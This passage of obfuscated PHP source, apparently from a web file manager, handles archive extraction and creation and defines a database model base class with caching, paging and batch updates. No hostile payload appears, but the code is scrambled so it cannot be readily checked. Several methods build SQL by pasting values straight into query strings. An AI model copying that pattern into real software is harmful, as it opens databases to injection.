$eËõƒÙ´å‚); goto AÈ‹ªÑÔ·æ; AÈ‹ªÑÔ·æ: if (!$b¥ÍÜ°¾£[$fİ‡×ÊÔ…[1017]]) { show_json($b¥ÍÜ°¾£[$fİ‡×ÊÔ…[1019]], !1); } if (!file_exists($A©äµ™ßŠ»)) { show_json($fİ‡×ÊÔ…[1838], !1); } @rename($A©äµ™ßŠ», $fªÛÁõÇ–); goto aùØÍïÓ©Î; aùØÍïÓ©Î: if (!file_exists($fªÛÁõÇ–)) { del_dir($aô§™ØÓéÖ); show_json($fİ‡×ÊÔ…[1839]); } IO::fileOut($fªÛÁõÇ–, $cŸœÊŠ¢•, $eËõƒÙ´å‚); goto f‚ğù†Êåö; d’ô«‰ º: $b¥ÍÜ°¾£ = self::extract($f›–ÁŒ†¬¾, $aô§™ØÓéÖ, $eÚÒ›¹¡í, $c˜¢Ú°†èê); if (is_array($c˜¢Ú°†èê)) { show_json($fİ‡×ÊÔ…[1837], !1); } if (file_exists($fªÛÁõÇ–)) { IO::fileOut($fªÛÁõÇ–, $cŸœÊŠ¢•, get_path_this($c˜¢Ú°†èê)); return; } goto cĞ† Ë¡ì; b’Š¡¿›‰: $fİ‡×ÊÔ… =& $_SERVER[¿õñ]; self::init(); $aô§™ØÓéÖ = TEMP_FILES . hash_path($f›–ÁŒ†¬¾) . $fİ‡×ÊÔ…[8]; goto Eõ¥öÇ¶Ñ¾; f‚ğù†Êåö: } static function create($E½´„»›ã, $cÜ”šöµ‡Ú) { $Aó²äìÀ =& $_SERVER[¿õñ]; self::init(); $FŞŠ¬©ˆ‡ = get_path_ext($E½´„»›ã); $c¬¦“´Çµ• = !1; if (self::checkIfType($FŞŠ¬©ˆ‡, $Aó²äìÀ[298])) { if (kodZipArchive::support($Aó²äìÀ[994])) { return kodZipArchive::create($E½´„»›ã, $cÜ”šöµ‡Ú); } $FŠÔŞÂ‚ëÓ = new PclZip($E½´„»›ã); foreach ($cÜ”šöµ‡Ú as $bÊƒ“æ¯«¡ => $D™’á÷–÷Ÿ) { $D™’á÷–÷Ÿ = str_replace($Aó²äìÀ[463], $Aó²äìÀ[8], $D™’á÷–÷Ÿ); $Fí‰‰™œ¤ = Kodio::clear(get_path_father($D™’á÷–÷Ÿ)); if ($bÊƒ“æ¯«¡ == 0) { $c¬¦“´Çµ• = $FŠÔŞÂ‚ëÓ->create($D™’á÷–÷Ÿ, PCLZIP_OPT_REMOVE_PATH, $Fí‰‰™œ¤, PCLZIP_CB_PRE_FILE_NAME, $Aó²äìÀ[1840]); continue; } $c¬¦“´Çµ• = $FŠÔŞÂ‚ëÓ->add($D™’á÷–÷Ÿ, PCLZIP_OPT_REMOVE_PATH, $Fí‰‰™œ¤, PCLZIP_CB_PRE_FILE_NAME, $Aó²äìÀ[1840]); } } else { if (self::checkIfType($FŞŠ¬©ˆ‡, $Aó²äìÀ[1809])) { foreach ($cÜ”šöµ‡Ú as $bÊƒ“æ¯«¡ => $D™’á÷–÷Ÿ) { $D™’á÷–÷Ÿ = str_replace($Aó²äìÀ[463], $Aó²äìÀ[8], $D™’á÷–÷Ÿ); $Fí‰‰™œ¤ = Kodio::clear(get_path_father($D™’á÷–÷Ÿ)); if ($bÊƒ“æ¯«¡ == 0) { $c¬¦“´Çµ• = PclTarCreate($E½´„»›ã, array($D™’á÷–÷Ÿ), $FŞŠ¬©ˆ‡, null, $Fí‰‰™œ¤); continue; } $c¬¦“´Çµ• = PclTarAddList($E½´„»›ã, array($D™’á÷–÷Ÿ), $Aó²äìÀ[33], $Fí‰‰™œ¤, $FŞŠ¬©ˆ‡); } } } return $c¬¦“´Çµ•; } } goto bŒ›ÁË÷’’; C«öôš´É‚: class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\x6f\144\151\146\x79\x54\x69\x6d\145", "\164\151\x6d\145", "\151\x6e\x73\145\162\164\54\165\160\x64\141\164\145", "\x66\165\156\x63\164\x69\157\156"), array("\x63\162\x65\x61\x74\145\x54\151\155\145", "\164\151\155\145", "\151\x6e\163\145\x72\164", "\146\165\156\x63\164\151\157\x6e")); public function setDataAuto($c·É±öŠàØ) { $this->dataAuto = $c·É±öŠàØ; } public function __construct($ešÛÂµÚ  = '', $aÁÁİä§Ç = '', $E´”é¸¢ê = '') { parent::__construct($ešÛÂµÚ , $aÁÁİä§Ç, $E´”é¸¢ê); } static function textEncode($DÃé£ì¿µ) { $Fî¨ôÄ’ ‡ =& $_SERVER[¿õñ]; if (!$DÃé£ì¿µ) { return $Fî¨ôÄ’ ‡[33]; } $B›¶ˆí™İô = json_encode($DÃé£ì¿µ); $B›¶ˆí™İô = preg_replace_callback($Fî¨ôÄ’ ‡[338], function ($A±“˜Â¼Ÿù) { return addslashes($A±“˜Â¼Ÿù[0]); }, $B›¶ˆí™İô); return json_decode($B›¶ˆí™İô); } static function textDecode($c›»î¤°ù») { $C²êùˆæºŠ =& $_SERVER[¿õñ]; $f¤¯«„„Ù² = json_encode($c›»î¤°ù»); $f¤¯«„„Ù² = preg_replace_callback($C²êùˆæºŠ[339], function ($Eø„±ëÔô™) { return $_SERVER[¿õñ][94]; }, $f¤¯«„„Ù²); return json_decode($f¤¯«„„Ù²); } protected $tableMeta = array(); protected function _beforeInsert(&$FÉ½¾–éïï, $dìˆ‰ï›‹ù) { $f‹µ‰¦ÎÏ¶ =& $_SERVER[¿õñ]; if (!$this->checkDataAutoHas($f‹µ‰¦ÎÏ¶[340])) { return; } $this->dataBeforeFilter($FÉ½¾–éïï, $f‹µ‰¦ÎÏ¶[340]); } protected function _beforeUpdate(&$eƒô›˜µŒï, $F¿¡Ó·÷›) { $B™‡Í¥´„ƒ =& $_SERVER[¿õñ]; if (!$this->checkDataAutoHas($B™‡Í¥´„ƒ[341])) { return; } $this->dataBeforeFilter($eƒô›˜µŒï, $B™‡Í¥´„ƒ[341]); } protected function _afterSelect(&$b‰¢âÚ©Ò, $cš¯˜ÃËã¬) { if (!is_array($b‰¢âÚ©Ò)) { return; } if (!$this->checkDataAutoHas($_SERVER[¿õñ][342])) { return; } foreach ($b‰¢âÚ©Ò as &$Fˆ¬Ò‡º›) { $this->dataAfterFilter($Fˆ¬Ò‡º›); } } protected function _afterFind(&$bæÃ®×†‰‡, $CÓª²š) { if (!is_array($bæÃ®×†‰‡)) { return; } if (!$this->checkDataAutoHas($_SERVER[¿õñ][342])) { return; } $this->dataAfterFilter($bæÃ®×†‰‡); } public function setAutoIncrement($cïÚªß—ğ”) { $e¼ÇŠàÎ«Š = array($this->getPk() => $cïÚªß—ğ”); $d¬ê•…‹³Ï = $this->data($e¼ÇŠàÎ«Š)->add(); if ($d¬ê•…‹³Ï) { $this->delete($d¬ê•…‹³Ï); } } public function getAutoIncrement() { $A‚¹¾‘õª = $this->getTableName(); $e¸Ã«¬‹”‚ = $this->max($this->getPk()); $f˜é´Ã»ßä = $this->query("\163\150\157\x77\x20\x74\x61\x62\x6c\145\x20\x73\164\141\x74\165\x73\40\167\150\145\x72\145\40\116\x61\x6d\x65\x3d\47{$A‚¹¾‘õª}\47"); $F¦“Í’í² = $f˜é´Ã»ßä[0][$_SERVER[¿õñ][343]]; $E¸°ŠÌã¢Ô = max($e¸Ã«¬‹”‚, $F¦“Í’í²); return $E¸°ŠÌã¢Ô; } protected function _callBefore($dÓêãæ¼“¢, $FÒ¯ÄØƒˆ£) { return $this->cacheCallCheck($dÓêãæ¼“¢, $FÒ¯ÄØƒˆ£, !1); } protected function _callAfter($aÚ‡£´ºá, $aš·šëŒŠ) { return $this->cacheCallCheck($aÚ‡£´ºá, $aš·šëŒŠ, !0); } protected function cacheFunctionAlias($E§¤ù›Şá) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($F¯¨¼©¿Ê„, $cƒ–ï÷‡İ, $FŸõØÜŒá  = false) { $f·åá¨Šœ´ = $this->cacheFunctionAlias($cƒ–ï÷‡İ); if (!$f·åá¨Šœ´) { return; } foreach ($f·åá¨Šœ´ as $eˆ½ïƒíÉ => $Cï¹Ù³ß‰ğ) { $B©ù¸×«îö = $Cï¹Ù³ß‰ğ[0]; $Dïç÷â¤Ññ = explode($_SERVER[¿õñ][47], $Cï¹Ù³ß‰ğ[1]); if ($F¯¨¼©¿Ê„ == $eˆ½ïƒíÉ) { return $this->cacheFunctionGet($eˆ½ïƒíÉ, $B©ù¸×«îö); } if ($FŸõØÜŒá  && in_array($F¯¨¼©¿Ê„, $Dïç÷â¤Ññ)) { $this->cacheFunctionClear($eˆ½ïƒíÉ, $B©ù¸×«îö); } } } public function cacheFunctionGet($eõ›êç›», $Dç²‘ªŒ×½) { $Bï÷µ‹™°¨ = $this->cacheKeyMake($eõ›êç›», $Dç²‘ªŒ×½); $eÇèËÆ¶†† = Cache::get($Bï÷µ‹™°¨); if (!is_array($eÇèËÆ¶††)) { $eÇèËÆ¶†† = call_user_func_array(array($this, $eõ›êç›»), array($Dç²‘ªŒ×½, !0)); Cache::set($Bï÷µ‹™°¨, $eÇèËÆ¶††); } return $eÇèËÆ¶††; } public function cacheFunctionClear($BÂ¾œ³“«, $B·îŞäÙôí) { $DÖ¨•ª˜±Ó = $B·îŞäÙôí; if (!is_array($B·îŞäÙôí)) { $DÖ¨•ª˜±Ó = array($B·îŞäÙôí); } foreach ($DÖ¨•ª˜±Ó as $CàÚ²Øè»Ù) { $F†½ÊòâŞ = $this->cacheKeyMake($BÂ¾œ³“«, $CàÚ²Øè»Ù); Cache::remove($F†½ÊòâŞ); } } private function cacheKeyMake($b‹­óÔ³Õ», $cƒÕŞÇÀ©“) { $eÔ‘Ñ…ÃÌÆ =& $_SERVER[¿õñ]; return get_class($this) . $eÔ‘Ñ…ÃÌÆ[71] . $b‹­óÔ³Õ» . $eÔ‘Ñ…ÃÌÆ[344] . $cƒÕŞÇÀ©“; } protected function selectPage($Dí†ºš¨¶ = 200, $E±Æ±Ã¨Ù = 1) { goto EÓÙ“ë›Õê; dõÇïö‹ñÂ: $cµ‰Ãí®İÇ = intval($this->count()); $Dí†ºš¨¶ = intval($Dí†ºš¨¶); $Dí†ºš¨¶ = $Dí†ºš¨¶ <= 5 ? 5 : ($Dí†ºš¨¶ >= $eçˆ¤ØƒÅ£ ? $eçˆ¤ØƒÅ£ : $Dí†ºš¨¶); goto AÊ§äŸâßî; E¸¯œ×µ–: $eçˆ¤ØƒÅ£ = 4000; $Dí†ºš¨¶ = isset($in[$Bè°Í¾ñèŒ[345]]) ? $in[$Bè°Í¾ñèŒ[345]] : $Dí†ºš¨¶; if ($Dí†ºš¨¶ === -1) { unset($in[$Bè°Í¾ñèŒ[345]]); $eçˆ¤ØƒÅ£ = 100000000; $Dí†ºš¨¶ = $eçˆ¤ØƒÅ£; } goto Cº§¬Ãœâ; AÊ§äŸâßî: $e²‹ÀãªÖŠ = ceil($cµ‰Ãí®İÇ / $Dí†ºš¨¶); $E±Æ±Ã¨Ù = intval(isset($in[$Bè°Í¾ñèŒ[336]]) ? $in[$Bè°Í¾ñèŒ[336]] : $E±Æ±Ã¨Ù); $E±Æ±Ã¨Ù = $E±Æ±Ã¨Ù <= 1 ? 1 : ($E±Æ±Ã¨Ù >= $e²‹ÀãªÖŠ ? $e²‹ÀãªÖŠ : $E±Æ±Ã¨Ù); goto eòŞ‹©‰ãÜ; eæØòÆ‚ïÌ: $dªìñÓÁˆ = array($Bè°Í¾ñèŒ[347] => array($Bè°Í¾ñèŒ[348] => $cµ‰Ãí®İÇ, $Bè°Í¾ñèŒ[345] => $Dí†ºš¨¶, $Bè°Í¾ñèŒ[336] => $E±Æ±Ã¨Ù, $Bè°Í¾ñèŒ[349] => $e²‹ÀãªÖŠ), $Bè°Í¾ñèŒ[350] => $cŞ³°šÊ–§ ? $cŞ³°šÊ–§ : array()); return $dªìñÓÁˆ; goto Cø³›ùË´ñ; eòŞ‹©‰ãÜ: $this->optionsValue($DÑŒÆÊäÔ’); $cŞ³°šÊ–§ = $this->page($E±Æ±Ã¨Ù, $Dí†ºš¨¶)->select(); if ($e²‹ÀãªÖŠ == 1) { $cµ‰Ãí®İÇ = count($cŞ³°šÊ–§); } goto eæØòÆ‚ïÌ; EÓÙ“ë›Õê: $Bè°Í¾ñèŒ =& $_SERVER[¿õñ]; global $in; $DÑŒÆÊäÔ’ = $this->optionsValue(); goto E¸¯œ×µ–; Cº§¬Ãœâ: $c¨‹ì•ÅÜ = $DÑŒÆÊäÔ’; $c¨‹ì•ÅÜ[$Bè°Í¾ñèŒ[346]] = array(); $this->optionsValue($c¨‹ì•ÅÜ); goto dõÇïö‹ñÂ; Cø³›ùË´ñ: } protected function checkLength($eë¶¬­ó¦«, $FÜ’Ô˜ÈÎÖ = 65536) { if (!$eë¶¬­ó¦« || strlen($eë¶¬­ó¦«) < $FÜ’Ô˜ÈÎÖ) { return; } show_json(LNG($_SERVER[¿õñ][351]) . "\50{$FÜ’Ô˜ÈÎÖ}\x29", !1); } protected function metaSet($D·ìÀ ›, $F¼­âÛÓ¿ì = null, $aŠåÇÚŠø = null) { goto Dò‘Ğ×Æª…; Dò‘Ğ×Æª…: $bÚØ½µõ³ =& $_SERVER[¿õñ]; if (!$this->tableMeta) { return !1; } $D­¥ĞĞ‡‹¹ = $this->tableMeta[$bÚØ½µõ³[352]]; goto Dó“¡‰§±; F®†±£»³: $eÓŒ¯Ê¥Ïç = !1; if ($E¿á’„†Ü¾->where($B®••“íöğ)->find()) { $eÓŒ¯Ê¥Ïç = $E¿á’„†Ü¾->where($B®••“íöğ)->save(array($bÚØ½µõ³[356] => $aŠåÇÚŠø)); } else { $B®••“íöğ[$bÚØ½µõ³[354]] = $aŠåÇÚŠø; $eÓŒ¯Ê¥Ïç = $E¿á’„†Ü¾->add($B®••“íöğ); } return $eÓŒ¯Ê¥Ïç; goto F÷ª²¾„‚; DªâôÒšÁæ: if (is_null($F¼­âÛÓ¿ì)) { return $E¿á’„†Ü¾->where(array($D­¥ĞĞ‡‹¹ => $D·ìÀ ›))->delete(); } if (is_null($aŠåÇÚŠø)) { return $E¿á’„†Ü¾->where($B®••“íöğ)->delete(); } $this->checkLength($aŠåÇÚŠø); goto F®†±£»³; Dó“¡‰§±: $E¿á’„†Ü¾ = Model($this->tableMeta[$bÚØ½µõ³[353]]); if (is_array($F¼­âÛÓ¿ì)) { $dïšèùÊˆ = array(); foreach ($F¼­âÛÓ¿ì as $F¯µ‘ˆèÊ‰ => $aöÁË—½îÄ) { $this->checkLength($aöÁË—½îÄ); $dïšèùÊˆ[] = array($D­¥ĞĞ‡‹¹ => $D·ìÀ ›, $bÚØ½µõ³[88] => $F¯µ‘ˆèÊ‰, $bÚØ½µõ³[354] => $aöÁË—½îÄ); } $E¿á’„†Ü¾->where(array($D­¥ĞĞ‡‹¹ => $D·ìÀ ›))->addAll($dïšèùÊˆ, array(), !0); return !0; } $B®••“íöğ = array($D­¥ĞĞ‡‹¹ => $D·ìÀ ›, $bÚØ½µõ³[355] => $F¼­âÛÓ¿ì); goto DªâôÒšÁæ; F÷ª²¾„‚: } public function metaGet($BÎ¤á“ ß°) { goto a„½ê°‚ï„; a„½ê°‚ï„: $B–êÚ©Ñ› =& $_SERVER[¿õñ]; if (!$this->tableMeta) { return array(); } $fÜ”ÔÄªÃ˜ = $this->tableMeta[$B–êÚ©Ñ›[352]]; goto eÉµ£›œå£; eÉµ£›œå£: $AŠÀîºŞÖñ = Model($this->tableMeta[$B–êÚ©Ñ›[353]]); $b‡À¨ÎÜòõ = array($fÜ”ÔÄªÃ˜ => $BÎ¤á“ ß°); $bã¯’ôéÃî = $AŠÀîºŞÖñ->field($B–êÚ©Ñ›[357])->where($b‡À¨ÎÜòõ)->select(); goto Cæ—”ùÒ­õ; Cæ—”ùÒ­õ: $bã¯’ôéÃî = array_to_keyvalue($bã¯’ôéÃî, $B–êÚ©Ñ›[88], $B–êÚ©Ñ›[354]); return $bã¯’ôéÃî; goto DÖç›íË³˜; DÖç›íË³˜: } private function checkDataAutoHas($CïÎ¦¨°ãÛ) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $B‚…ª™øÉ) { if (in_array($CïÎ¦¨°ãÛ, explode($_SERVER[¿õñ][47], $B‚…ª™øÉ[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$e¾í­¸ĞÕ±, $bù‚ÒµîÖã) { $D÷’£Ãîéò =& $_SERVER[¿õñ]; foreach ($this->dataAuto as $f˜—ÌòòŒÁ) { $f¶ğ‹Åãô = $f˜—ÌòòŒÁ[0]; if (!in_array($bù‚ÒµîÖã, explode($D÷’£Ãîéò[47], $f˜—ÌòòŒÁ[2]))) { continue; } switch (trim($f˜—ÌòòŒÁ[3])) { case $D÷’£Ãîéò[306]: case $D÷’£Ãîéò[307]: $fØ•á¤Ë = $f˜—ÌòòŒÁ[1]; $BÖÀì°˜¾ = isset($f˜—ÌòòŒÁ[4]) ? (array) $f˜—ÌòòŒÁ[4] : array(); if ($fØ•á¤Ë == $D÷’£Ãîéò[187] && array_key_exists($f¶ğ‹Åãô, $e¾í­¸ĞÕ±)) { if (!$e¾í­¸ĞÕ±[$f¶ğ‹Åãô]) { unset($e¾í­¸ĞÕ±[$f¶ğ‹Åãô]); } break; } if (isset($e¾í­¸ĞÕ±[$f¶ğ‹Åãô])) { array_unshift($BÖÀì°˜¾, $e¾í­¸ĞÕ±[$f¶ğ‹Åãô]); } if ($D÷’£Ãîéò[306] == $f˜—ÌòòŒÁ[3]) { $e¾í­¸ĞÕ±[$f¶ğ‹Åãô] = call_user_func_array($fØ•á¤Ë, $BÖÀì°˜¾); } else { $e¾í­¸ĞÕ±[$f¶ğ‹Åãô] = call_user_func_array(array(&$this, $fØ•á¤Ë), $BÖÀì°˜¾); } break; case $D÷’£Ãîéò[258]: $e¾í­¸ĞÕ±[$f¶ğ‹Åãô] = $e¾í­¸ĞÕ±[$f˜—ÌòòŒÁ[1]]; break; case $D÷’£Ãîéò[279]: if (isset($e¾í­¸ĞÕ±[$f¶ğ‹Åãô]) && !is_string($e¾í­¸ĞÕ±[$f¶ğ‹Åãô])) { $e¾í­¸ĞÕ±[$f¶ğ‹Åãô] = json_encode_force($e¾í­¸ĞÕ±[$f¶ğ‹Åãô]); } break; case $D÷’£Ãîéò[308]: if ($e¾í­¸ĞÕ±[$f¶ğ‹Åãô] === $D÷’£Ãîéò[33]) { unset($e¾í­¸ĞÕ±[$f¶ğ‹Åãô]); } break; case $D÷’£Ãîéò[309]: $e¾í­¸ĞÕ±[$f¶ğ‹Åãô] = $f˜—ÌòòŒÁ[1]; default: break; } } if ($bù‚ÒµîÖã == $D÷’£Ãîéò[340]) { $a¯²¸›Ù–Œ = strtolower($this->db->getDbType()); if (strpos($a¯²¸›Ù–Œ, $D÷’£Ãîéò[9]) !== 0) { return; } $DÅ‘”§ˆîì = $this->field(!0)->fields; $aô÷Æ«…òª = $DÅ‘”§ˆîì[$D÷’£Ãîéò[237]]; if (isset($DÅ‘”§ˆîì[$D÷’£Ãîéò[236]])) { unset($aô÷Æ«…òª[$DÅ‘”§ˆîì[$D÷’£Ãîéò[236]]]); } foreach ($aô÷Æ«…òª as $dÖÇëà„ÛÍ => $bù‚ÒµîÖã) { if (!isset($e¾í­¸ĞÕ±[$dÖÇëà„ÛÍ])) { $e¾í­¸ĞÕ±[$dÖÇëà„ÛÍ] = $D÷’£Ãîéò[33]; } } } } private function dataAfterFilter(&$FšÆª«ÔÊ…) { $F÷¯ÄØ†ù =& $_SERVER[¿õñ]; foreach ($this->dataAuto as $ağ°ã“Œâ½) { $CÏ…‘ò¿§ = $ağ°ã“Œâ½[0]; if (!in_array($F÷¯ÄØ†ù[342], explode($F÷¯ÄØ†ù[47], $ağ°ã“Œâ½[2]))) { continue; } if (!isset($FšÆª«ÔÊ…[$CÏ…‘ò¿§])) { continue; } switch (trim($ağ°ã“Œâ½[3])) { case $F÷¯ÄØ†ù[306]: case $F÷¯ÄØ†ù[307]: $FÄËÎ†ŠŠã = isset($ağ°ã“Œâ½[4]) ? (array) $ağ°ã“Œâ½[4] : array(); array_unshift($FÄËÎ†ŠŠã, $FšÆª«ÔÊ…[$CÏ…‘ò¿§]); if ($F÷¯ÄØ†ù[306] == $ağ°ã“Œâ½[3]) { $FšÆª«ÔÊ…[$CÏ…‘ò¿§] = call_user_func_array($ağ°ã“Œâ½[1], $FÄËÎ†ŠŠã); } else { $FšÆª«ÔÊ…[$CÏ…‘ò¿§] = call_user_func_array(array(&$this, $ağ°ã“Œâ½[1]), $FÄËÎ†ŠŠã); } break; case $F÷¯ÄØ†ù[258]: $FšÆª«ÔÊ…[$CÏ…‘ò¿§] = $FšÆª«ÔÊ…[$ağ°ã“Œâ½[1]]; break; case $F÷¯ÄØ†ù[279]: $d¤à‹ïÙÆ = $FšÆª«ÔÊ…[$CÏ…‘ò¿§]; $FšÆª«ÔÊ…[$CÏ…‘ò¿§] = json_decode($d¤à‹ïÙÆ, !0); if (is_null($FšÆª«ÔÊ…[$CÏ…‘ò¿§])) { $FšÆª«ÔÊ…[$CÏ…‘ò¿§] = $d¤à‹ïÙÆ; } break; case $F÷¯ÄØ†ù[308]: if ($FšÆª«ÔÊ…[$CÏ…‘ò¿§] === $F÷¯ÄØ†ù[33]) { unset($FšÆª«ÔÊ…[$CÏ…‘ò¿§]); } break; case $F÷¯ÄØ†ù[309]: $FšÆª«ÔÊ…[$CÏ…‘ò¿§] = $ağ°ã“Œâ½[1]; default: break; } } } public function saveAll($E•‚˜æ’„) { goto EŒµ‘½«Ú§; F§ÔŸ¿’è¨: $FŞÏäÂ†Òñ = count($E•‚˜æ’„); for ($e¢ò¢‚º‰Ş = 0; $e¢ò¢‚º‰Ş < $FŞÏäÂ†Òñ; $e¢ò¢‚º‰Ş++) { $cœòóÈ‘£ = $E•‚˜æ’„[$e¢ò¢‚º‰Ş]; if (!is_array($cœòóÈ‘£) || count($cœòóÈ‘£) != 4) { continue; } $bÛì†ğ½À = "\x55\x50\x44\101\124\105\x20{$EÎ´¹÷¢Ëô}\40\x53\105\x54\x20{$cœòóÈ‘£[2]}\x20\x3d\x20\103\101\123\x45\40{$cœòóÈ‘£[0]}\40\xa"; if ($C«¡ì†Şâí == 0) { $BğÆÉŒÚøö = $bÛì†ğ½À; } $aŞªÑ—†Íç[] = $A¡¨ÃÎˆÑ[112] . $cœòóÈ‘£[1] . $A¡¨ÃÎˆÑ[112]; $C«¡ì†Şâí++; $BğÆÉŒÚøö .= "\40\x57\110\x45\116\40\x27{$cœòóÈ‘£[1]}\47\40\124\x48\x45\116\40\x27{$cœòóÈ‘£[3]}\47\x20\12"; if ($C«¡ì†Şâí == $d·´êÀ‚±¯ || $e¢ò¢‚º‰Ş == $FŞÏäÂ†Òñ - 1) { goto a‘•©à¨™; cÜ®‡µ¡¾—: $aŞªÑ—†Íç = array(); goto AˆÚ—İø‚; a‘•©à¨™: $b—’ïÎ¯æ¨ = implode($A¡¨ÃÎˆÑ[47], $aŞªÑ—†Íç); $BğÆÉŒÚøö .= "\40\x45\116\x44\x20\x20\x57\110\105\x52\x45\40{$cœòóÈ‘£[0]}\x20\x49\x4e\x20\x28{$b—’ïÎ¯æ¨}\x29\x20"; $this->execute($BğÆÉŒÚøö); goto dŸŸ…¦ÛĞŠ; dŸŸ…¦ÛĞŠ: $C«¡ì†Şâí = 0; $BğÆÉŒÚøö = $bÛì†ğ½À; $this->chunkEventCheck(count($aŞªÑ—†Íç)); goto cÜ®‡µ¡¾—; AˆÚ—İø‚: } } $this->chunkEventSet(); goto F¹¤’ˆñĞ¯; fÍ†­¼‘ÓÃ: $BğÆÉŒÚøö = $A¡¨ÃÎˆÑ[358]; $C«¡ì†Şâí = 0; $aŞªÑ—†Íç = array(); goto F§ÔŸ¿’è¨; EŒµ‘½«Ú§: $A¡¨ÃÎˆÑ =& $_SERVER[¿õñ]; $EÎ´¹÷¢Ëô = $this->tablePrefix . $this->tableName; $d·´êÀ‚±¯ = self::SQL_WHERE_IN_CHUNK; goto fÍ†­¼‘ÓÃ; F¹¤’ˆñĞ¯: } public function saveAllEach($DàÅ’½ö²ñ) { $EÊšèÒËÅ =& $_SERVER[¿õñ]; $A’ÀåÄ‹„ñ = $this->tablePrefix . $this->tableName; foreach ($DàÅ’½ö²ñ as $A’¢±®ÍŞø) { if (!is_array($A’¢±®ÍŞø) || count($A’¢±®ÍŞø) != 4) { continue; } $EâÄ½’Ùí® = $A’¢±®ÍŞø[0] . $EÊšèÒËÅ[359] . $A’¢±®ÍŞø[1] . $EÊšèÒËÅ[112]; $Fªê±Ú¡°Š = $A’¢±®ÍŞø[2] . $EÊšèÒËÅ[359] . $A’¢±®ÍŞø[3] . $EÊšèÒËÅ[112]; $EĞÈ“™’œ = "\x75\160\x64\141\x74\145\x20{$A’ÀåÄ‹„ñ}\40\163\145\x74\x20{$Fªê±Ú¡°Š}\x20\x77\x68\x65\x72\x65\x20{$EâÄ½’Ùí®}\73"; $this->execute($EĞÈ“™’œ); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($AÑÕÅİ¦îƒ = false, $eÜŞ”ˆ³ç‰ = false) { $this->_chunkEvent = $AÑÕÅİ¦îƒ; $this->_chunkEventParam = $eÜŞ”ˆ³ç‰; } private function chunkEventCheck($c›÷×ñ¦¨é) { if (!$this->_chunkEvent) { return; } $dŠÁ§ÎË = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $dŠÁ§ÎË[$_SERVER[¿õñ][360]] = $c›÷×ñ¦¨é; Hook::trigger($this->_chunkEvent, $dŠÁ§ÎË); } public function addAll($eœ´Äªˆ¸—, $FÚÅä›ö = array(), $eºîàì‘× = false) { goto a‘ÑŸÆçîö; a‘ÑŸÆçîö: $d†Äê“ë—Ï =& $_SERVER[¿õñ]; ignore_timeout(); $AÄ˜†Ô…‹º = self::SQL_WHERE_IN_CHUNK; goto bÄºÈ²†œš; a’İÍÕåİ: if (method_exists($this->db, $d†Äê“ë—Ï[257])) { for ($A”íîàÕŒ× = 0; $A”íîàÕŒ× < count($eœ´Äªˆ¸—); $A”íîàÕŒ× += $AÄ˜†Ô…‹º) { $EÍƒóØ²º = array_slice($eœ´Äªˆ¸—, $A”íîàÕŒ×, $AÄ˜†Ô…‹º); if (!is_array($EÍƒóØ²º) || count($EÍƒóØ²º) == 0) { break; } $E˜ÆÇí‡…İ = $this->db->insertAll($EÍƒóØ²º, $FÚÅä›ö, $eºîàì‘×); $this->chunkEventCheck(count($EÍƒóØ²º)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($eœ´Äªˆ¸— as $eéº±Îö•ø => $cø‹ÔÊÉÈĞ) { $E˜ÆÇí‡…İ = $this->db->insert($cø‹ÔÊÉÈĞ, $FÚÅä›ö, $eºîàì‘×); } $this->commit(); } if (!1 !== $E˜ÆÇí‡…İ) { $BÙ×‘çø•œ = $this->getLastInsID(); if ($BÙ×‘çø•œ) { return $BÙ×‘çø•œ; } } return $E˜ÆÇí‡…İ; goto AœãëˆòŞ; bÄºÈ²†œš: if (empty($eœ´Äªˆ¸—)) { $this->error = think_lang($d†Äê“ë—Ï[256]); return !1; } $FÚÅä›ö = $this->_parseOptions($FÚÅä›ö); foreach ($eœ´Äªˆ¸— as $eéº±Îö•ø => $cø‹ÔÊÉÈĞ) { $eœ´Äªˆ¸—[$eéº±Îö•ø] = $this->_facade($cø‹ÔÊÉÈĞ); $this->_beforeInsert($eœ´Äªˆ¸—[$eéº±Îö•ø], $FÚÅä›ö); } goto a’İÍÕåİ; AœãëˆòŞ: } public function save($cˆæ­‚Š‹ = '', $b²³ŒÅ³“Ø = array()) { goto FË¬Í¦¢¶; FË¬Í¦¢¶: $Eëâƒåòªà =& $_SERVER[¿õñ]; $Dšóê²çŠ = self::SQL_WHERE_IN_CHUNK; $bòåçá‹µÊ = $this->optionsValue(); goto fî¼¥ùŒğ§; fî¼¥ùŒğ§: $eß£›ä§‡è = $this->findWhereField($bòåçá‹µÊ); if (!$eß£›ä§‡è) { return parent::save($cˆæ­‚Š‹, $b²³ŒÅ³“Ø); } $DíÊÌå×˜ = 0; goto c…Ò‚»™çÃ; c…Ò‚»™çÃ: $E“ä”ÓÑøÍ = $bòåçá‹µÊ[$Eëâƒåòªà[260]][$eß£›ä§‡è][1]; $fªá—ƒ„— = count($E“ä”ÓÑøÍ); for ($dæî’¸¬¼Œ = 0; $dæî’¸¬¼Œ < $fªá—ƒ„—; $dæî’¸¬¼Œ += $Dšóê²çŠ) { $eÀÚ¡³«íè = array_slice($E“ä”ÓÑøÍ, $dæî’¸¬¼Œ, $Dšóê²çŠ); if (!is_array($eÀÚ¡³«íè) || count($eÀÚ¡³«íè) == 0) { break; } $bòåçá‹µÊ[$Eëâƒåòªà[260]][$eß£›ä§‡è][1] = $eÀÚ¡³«íè; $this->optionsValue($bòåçá‹µÊ); $DíÊÌå×˜ += parent::save($cˆæ­‚Š‹, $b²³ŒÅ³“Ø); $this->chunkEventCheck(count($eÀÚ¡³«íè)); } goto E±†ñãÄ—; E±†ñãÄ—: $this->chunkEventSet(); return $DíÊÌå×˜; goto E¨šö¥ñÇ; E¨šö¥ñÇ: } public function add($c¢ŒÖ›œöø = '', $DäŒİ¦Êå = array(), $D„¼ÕŞ±ë = false) { if ($this->addTaskStatus && is_array($c¢ŒÖ›œöø)) { $this->addTaskData[] = $c¢ŒÖ›œöø; return; } return parent::add($c¢ŒÖ›œöø, $DäŒİ¦Êå, $D„¼ÕŞ±ë); } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } 